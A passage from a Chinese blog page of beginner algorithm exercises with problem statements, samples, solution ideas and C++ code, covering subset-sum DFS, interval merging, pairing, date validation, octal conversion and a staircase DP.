&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; k &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> tmp1, tmp2;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; tmp1 &gt;&gt; tmp2;</span><br><span class="line">        <span class="built_in">map</span>[tmp1][tmp2] = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">map</span>[tmp2][tmp1] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; res &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="部分和问题"><a href="#部分和问题" class="headerlink" title="部分和问题"></a>部分和问题</h3><h4 id="题目描述-14"><a href="#题目描述-14" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定n个整数，判断是否可以从中选择若干数字，使得他们的和恰好为k。</p><h4 id="输入-14"><a href="#输入-14" class="headerlink" title="输入"></a>输入</h4><p>多组测试用例。</p><p>对于每组测试用例，第一行一个正整数n，第二行n个整数，第三行一个整数k。</p><p>1≤N≤20，输入整数及k均小于1e8。</p><h4 id="输出-14"><a href="#输出-14" class="headerlink" title="输出"></a>输出</h4><p>若可以使得和为k，输出”Yes”,否则”No”。</p><h4 id="样例输入-14"><a href="#样例输入-14" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">1 2 4 7</span><br><span class="line">13</span><br></pre></td></tr></table></figure><h4 id="样例输出-14"><a href="#样例输出-14" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Yes</span><br></pre></td></tr></table></figure><h4 id="思路-12"><a href="#思路-12" class="headerlink" title="思路"></a>思路</h4><p>每个数有加或不加两种可能，可以构造一棵二叉树，深度优先遍历，终止调节为和达到要求（返回true），遍历完全（返回false）。</p><h4 id="代码-11"><a href="#代码-11" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">25</span>;</span><br><span class="line"><span class="keyword">int</span> n, k, d[maxn];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> sum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (sum == k)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (l == n)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> dfs(l + <span class="number">1</span>, sum) || dfs(l + <span class="number">1</span>, sum + d[l]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; d[i];</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; k;</span><br><span class="line">        <span class="keyword">if</span> (dfs(<span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"Yes"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"No"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="法师康的工人"><a href="#法师康的工人" class="headerlink" title="法师康的工人"></a>法师康的工人</h3><h4 id="题目描述-15"><a href="#题目描述-15" class="headerlink" title="题目描述"></a>题目描述</h4><p>三个法师康的工人每天早上6点到工厂开始到三条产品生产线上组装桔子手机。第一个工人在200时刻开始（从6点开始计时，以秒作为单位）在生产线上开始生产，一直到1000时刻。第二个工人，在700时刻开始，在1100时刻结束。第三个工人从1500时刻工作到2100时刻。期间最长至少有一个工人在生产线上工作的连续时间为900秒（从200时刻到1100时刻），而最长的无人生产的连续时间（从生产开始到生产结束）为400时刻（1100时刻到1500时刻）。</p><p>你的任务是用一个程序衡量N个工人在N条产品线上的工作时间列表（1≤N≤5000，以秒为单位）。</p><p>·最长的至少有一个工人在工作的时间段</p><p>·最长的无人工作的时间段（从有人工作开始计）</p><h4 id="输入-15"><a href="#输入-15" class="headerlink" title="输入"></a>输入</h4><p>输入第1行为一个整数N，第2-N+1行每行包括两个均小于1000000的非负整数数据，表示其中一个工人的生产开始时间与结束时间。</p><h4 id="输出-15"><a href="#输出-15" class="headerlink" title="输出"></a>输出</h4><p>输出为一行，用空格分隔开两个我们所求的数。</p><h4 id="样例输入-15"><a href="#样例输入-15" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">200 1000</span><br><span class="line">700 1100</span><br><span class="line">1500 2100</span><br></pre></td></tr></table></figure><h4 id="样例输出-15"><a href="#样例输出-15" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">900 400</span><br></pre></td></tr></table></figure><h4 id="思路-13"><a href="#思路-13" class="headerlink" title="思路"></a>思路</h4><ul><li><p>先按开始时间排序，然后对每个人进行遍历。</p></li><li><p>如果前人的结束时间小于后人的开始时间，那么中间这段连续时间是没有人的，则更新最长的无人工作的时间。并重新开始计算最大连续工作时间，也就是更新<code>startindex</code>。</p></li><li><p>每次循环都更新最大结束时间<code>endindex</code>，最大连续工作时间等于<code>max(maxx,endindex-startindex)</code>。</p></li><li><p>不断更新直到最后一个人。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> start, <span class="built_in">end</span>;</span><br><span class="line">&#125; a[<span class="number">5055</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(node x, node y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x.start == y.start)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> x.<span class="built_in">end</span> &lt; y.<span class="built_in">end</span>; <span class="comment">//将开始时间相同时，对结束时间不同进行排序</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> x.start &lt; y.start;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">int</span> maxx, minn, sindex, eindex;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a[i].start &gt;&gt; a[i].<span class="built_in">end</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(a, a + n, cmp); <span class="comment">//对结构体进行排序</span></span><br><span class="line">    maxx = a[<span class="number">0</span>].<span class="built_in">end</span> - a[<span class="number">0</span>].start;</span><br><span class="line">    minn = <span class="number">0</span>;</span><br><span class="line">    sindex = a[<span class="number">0</span>].start;</span><br><span class="line">    eindex = a[<span class="number">0</span>].<span class="built_in">end</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[i].start &gt; eindex)</span><br><span class="line">        &#123; <span class="comment">//找到断层的时间，即无人工作的时间</span></span><br><span class="line">            minn = <span class="built_in">max</span>(minn, a[i].start - eindex);</span><br><span class="line">            sindex = a[i].start;<span class="comment">//因为断层了，所以重新开始计最大连续工作时间</span></span><br><span class="line">        &#125;</span><br><span class="line">        eindex = <span class="built_in">max</span>(eindex, a[i].<span class="built_in">end</span>); <span class="comment">//获取最大的连续结束时间</span></span><br><span class="line">        maxx = <span class="built_in">max</span>(maxx, eindex - sindex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; maxx &lt;&lt; <span class="string">" "</span> &lt;&lt; minn &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="配对元素"><a href="#配对元素" class="headerlink" title="配对元素"></a>配对元素</h3><h4 id="题目描述-16"><a href="#题目描述-16" class="headerlink" title="题目描述"></a>题目描述</h4><p>给出2个序列A={a[1]，a[2]，…，a[n]}，B={b[1]，b[2]，…，b[n]}，从A、B中各选出n个元素进行一一配对（可以不按照原来在序列中的顺序），并使得所有配对元素差的绝对值之和最大。</p><h4 id="输入-16"><a href="#输入-16" class="headerlink" title="输入"></a>输入</h4><p>输入的第1行为1个整数n 第2行包含n个整数，题目中的A序列。 第3行包含n个整数，题目中的B序列。</p><h4 id="输出-16"><a href="#输出-16" class="headerlink" title="输出"></a>输出</h4><p>一个数，最大配对</p><p>3与6配对，2与7配对，5与4配对，6与1配对，绝对值之差和为14 对于10%的数据，有n≤20； 对于30%的数据，有n≤100； 对于50%的数据，有n≤1000； 对于100%的数据，有n≤10000；a[i]，b[i]≤1000。</p><h4 id="样例输入-16"><a href="#样例输入-16" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">2 5 6 3</span><br><span class="line">1 4 6 7</span><br></pre></td></tr></table></figure><h4 id="样例输出-16"><a href="#样例输出-16" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">14</span><br></pre></td></tr></table></figure><h4 id="思路-14"><a href="#思路-14" class="headerlink" title="思路"></a>思路</h4><p>将两个数组分别进行升序和降序排列，然后让一个数组的最大值与另一个数组的最小值相减，依次类推，然后累和即可。</p><h4 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">10005</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn], b[maxn];</span><br><span class="line"><span class="keyword">int</span> n, sum;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a &gt; b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; b[i];</span><br><span class="line">    &#125;</span><br><span class="line">    sort(a, a + n);</span><br><span class="line">    sort(b, b + n, cmp);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> temp = <span class="built_in">abs</span>(b[i] - a[i]);</span><br><span class="line">        sum += temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; sum &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="判断日期是否符合格式"><a href="#判断日期是否符合格式" class="headerlink" title="判断日期是否符合格式"></a>判断日期是否符合格式</h3><h4 id="题目描述-17"><a href="#题目描述-17" class="headerlink" title="题目描述"></a>题目描述</h4><p>我们知道一年有12个月，每个月最多有31天，年有平年和闰年之分，本题目要求如果输入一个日期，程序需要判断用户输入的日期是否正确。</p><p>提示：测试输入的三个数字中，年份是正数，月份和日期有可能是负数，程序需要对这两个数为负数的情况进行判断。</p><h4 id="输入-17"><a href="#输入-17" class="headerlink" title="输入"></a>输入</h4><p>多组测试用例，对每组测试用例：</p><p>用户输入是三个数字，分别表示年，月和日。 例如 2007 10 21 ，表示2007年10月21日，这个输入经过判断是正确的。又例如输入 1993 11 38 ，这个输入经过判断是错误的，因为日期不能超过31天。</p><h4 id="输出-17"><a href="#输出-17" class="headerlink" title="输出"></a>输出</h4><p>程序的输出分为两种，1或者0。1表示输入正确，0表示输入错误。</p><h4 id="样例输入-17"><a href="#样例输入-17" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2011 21 10</span><br></pre></td></tr></table></figure><h4 id="样例输出-17"><a href="#样例输出-17" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0</span><br></pre></td></tr></table></figure><h4 id="思路-15"><a href="#思路-15" class="headerlink" title="思路"></a>思路</h4><p>闰年判断：（能被4整除<code>&amp;&amp;</code>不能被100整除）<code>||</code>能被400整除<br>其他没啥好说的，开一个大小为12的数组<code>month[12]</code>，存每个月的天数，如果是闰年的话就将<code>month[1]</code>加1</p><h4 id="解答-3"><a href="#解答-3" class="headerlink" title="解答"></a>解答</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Judge</span><span class="params">(<span class="keyword">int</span> year)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((year % <span class="number">4</span> == <span class="number">0</span> &amp;&amp; year % <span class="number">100</span> != <span class="number">0</span>) || year % <span class="number">400</span> == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> y, m, d;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; y &gt;&gt; m &gt;&gt; d)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> month[<span class="number">12</span>] = &#123;<span class="number">31</span>, <span class="number">28</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (Judge(y))</span><br><span class="line">            month[<span class="number">1</span>]++;</span><br><span class="line">        <span class="keyword">if</span> (m &gt; <span class="number">0</span> &amp;&amp; m &lt;= <span class="number">12</span> &amp;&amp; d &gt; <span class="number">0</span> &amp;&amp; d &lt;= month[m - <span class="number">1</span>])</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; flag &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><h4 id="题目描述-18"><a href="#题目描述-18" class="headerlink" title="题目描述"></a>题目描述</h4><p>输入一个十进制正整数，然后输出它所对应的八进制数。</p><h4 id="输入-18"><a href="#输入-18" class="headerlink" title="输入"></a>输入</h4><p>输入一个十进制正整数n(1≤n≤106) 。</p><h4 id="输出-18"><a href="#输出-18" class="headerlink" title="输出"></a>输出</h4><p>输出n对应的八进制数，输出在一行。</p><h4 id="样例输入-18"><a href="#样例输入-18" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10</span><br></pre></td></tr></table></figure><h4 id="样例输出-18"><a href="#样例输出-18" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12</span><br></pre></td></tr></table></figure><h4 id="代码-12"><a href="#代码-12" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x, count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> r[<span class="number">100000</span>];</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; x;</span><br><span class="line">    <span class="keyword">while</span> (x != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        r[count++] = x % <span class="number">8</span>;</span><br><span class="line">        x = x / <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//倒序输出</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = count - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; r[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="16级考试题目"><a href="#16级考试题目" class="headerlink" title="16级考试题目"></a>16级考试题目</h2><h3 id="问题-A-星空梦想——鲁班"><a href="#问题-A-星空梦想——鲁班" class="headerlink" title="问题 A: 星空梦想——鲁班"></a>问题 A: 星空梦想——鲁班</h3><h4 id="题目描述-19"><a href="#题目描述-19" class="headerlink" title="题目描述"></a>题目描述</h4><p>鲁班七号是王者峡谷里的射手，站撸英雄。战场上的鲁班七号，机制强大的鲨嘴炮，立刻将挡在前路的任何物体轰飞。正如他所说的，“借你们的肉体试验下新发明的威力”。是的，这就是鲁班大师和他的天才机关造物鲁班七号。然而，鲁班最为致命的缺点是腿短，跑得慢，一个稍不留神，便会被刺客所击杀。</p><p>既然腿短，那么就来多多运动吧，跳跳台阶可还行？假设鲁班七号一次可以跳上1级台阶，但极限一次只能跳上2级台阶（腿短没办法，嘤嘤嘤）。鲁班七号现在从0级阶梯开始，最终跳上第n级的台阶，求总共有多少种跳法？</p><h4 id="输入-19"><a href="#输入-19" class="headerlink" title="输入"></a>输入</h4><p>多组测试用例。</p><p>第一行输入包含一个整数T（1&lt;=T&lt;=50），代表测试用例个数。</p><p>接下来T行，每行输入包含一个整数n（1&lt;=n&lt;=50），代表鲁班最终跳上了第n级台阶。</p><h4 id="输出-19"><a href="#输出-19" class="headerlink" title="输出"></a>输出</h4><p>每组测试用例对应一行输出，每行输出一个整数ans，代表鲁班最终跳上第n级台阶的跳法种数。</p><h4 id="样例输入-19"><a href="#样例输入-19" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">50</span><br></pre></td></tr></table></figure><h4 id="样例输出-19"><a href="#样例输出-19" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">5</span><br><span class="line">20365011074</span><br></pre></td></tr></table></figure><h4 id="提示-1"><a href="#提示-1" class="headerlink" title="提示"></a>提示</h4><p>注意结果超过int范围，请用long long类型存储ans</p><h4 id="思路-16"><a href="#思路-16" class="headerlink" title="思路"></a>思路</h4><p>思路一：递归法+打表</p><p>思路二：动态规划</p><p>用<code>dp[i]</code>表示跳到第<code>i</code>级台阶的方法数，则<code>dp[1]=1</code>、<code>dp[2]=2</code> … <code>dp[i]=dp[i-1]+dp[i-2]</code>，即到第<code>i</code>级台阶的最后一步可以选择跳1级，也可以选择跳2级，而这两种方法的结果我们已经由动态规划得到，直接相加即可。</p><h4 id="代码-13"><a href="#代码-13" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">55</span>;</span><br><span class="line">ll dp[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t, n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; t;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; n)</span><br><span class="line">    &#123;</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        dp[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt;= n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            dp[i] = dp[i - <span class="number">1</span>] + dp[i - <span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; dp[n] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="问题-B-午夜歌剧——元歌"><a href="#问题-B-午夜歌剧——元歌" class="headerlink" title="问题 B: 午夜歌剧——元歌"></a>问题 B: 午夜歌剧——元歌</h3><h4 id="题目描述-20"><a href="#题目描述-20" class="headerlink" 